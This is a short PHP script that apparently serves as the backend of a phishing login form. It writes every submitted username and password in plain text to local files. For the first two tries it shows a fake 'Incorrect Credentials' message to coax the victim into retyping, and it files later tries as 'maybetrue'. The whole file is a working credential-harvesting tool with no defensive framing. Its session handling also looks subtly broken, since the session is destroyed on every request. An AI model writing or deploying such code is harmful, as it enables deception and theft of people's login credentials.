<?php 
  session_start();
    
    $error = "";
    
   
    if (!isset($_SESSION['attempts'])) {
        $_SESSION['attempts'] = 0;
    }

    if (isset($_POST['submit'])) {
        $user = $_POST['user'];
        $pass = $_POST['pass'];

       
        $_SESSION['attempts']++;


        if ($_SESSION['attempts'] <= 2) {
            
            $file = fopen("invalid.txt", "a");
            fwrite($file, "Username: " . $user . " Password: " . $pass . "\n");
            fclose($file);
            
            $error = "Incorrect Credentials"; 
        } else {
           
            $file2 = fopen("maybetrue.txt", "a");
            fwrite($file2, "Username: " . $user . " Password: " . $pass . "\n");
            fclose($file2);
        }
    }
    session_destroy();

?>